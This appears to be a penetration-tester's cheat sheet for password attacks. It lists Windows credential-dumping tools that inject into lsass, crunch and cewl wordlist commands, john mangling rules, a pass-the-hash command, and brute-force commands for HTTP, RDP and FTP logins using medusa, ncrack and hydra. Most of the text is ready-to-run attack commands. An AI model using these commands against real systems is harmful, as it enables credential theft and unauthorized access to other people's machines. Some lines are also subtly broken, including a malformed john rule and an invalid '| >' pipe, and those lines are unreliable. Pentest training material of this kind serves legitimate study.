# Windows Tools
## fgdump.exe
Injects dll code into lsass process with hash cracking code.

Dumps Windows Password Hashes (requires Administrative Privs)

## wce.exe (Windows Credential Editor)
```
wce64.exe   # for x64
wce.exe     # for x86
```

## pwdump.exe

Injects dll code into lsass process with hash cracking code.

Dumps Windows Password Hashes (requires Administrative Privs)

## Crunch
```
# See man page for examples
root@kali:~# crunch 6 6 0123456789ABCDEF -o crunch1.txt 
root@kali:~# crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha 
# @ - Lower case alpha characters 
# , - Upper case alpha characters 
# % - Numeric characters 
# ^ - Special characters including space 
root@kali:~# crunch 8 8 -t ,@@^^%%% 
```

## Passing the Hash
Capture NT/LM hash

```
export SMBHASH=<NT/LMHASH>
pth-winexe -U administrator% //10.x.x.x cmd
```

## Password Profiling
```
cewl www.google.com -m 6 -w /root/Desktop/google-words.txt

# john tricks
# add 2 numbers to the end of every password
$[0-9]$[0-90]  # (/etc/john/john.conf)
john --wordlist=/root/Desktop/google-words.txt --rules --stdout | > /root/Desktop/mangled.txt
```

# Online Attacks

## Medusa
```
medusa -h 10.x.x.x -u admin -P wordlist.txt -M http -m DIR:/admin -T 20     # for htaccess file protected page
```
## Ncrack (reliable for rdp)
```
ncrack -v -f --user administrator -P wordlist.txt rdp://10.x.x.x,CL=1
```

## Hydra (can be used for lots of online schemes)
```
hydra -l admin -P wordlist.txt -v 10.x.x.x ftp
```

## LM/NTLM
xp/2k3 and prior use LM

vista/2k8 and newer use NTLM
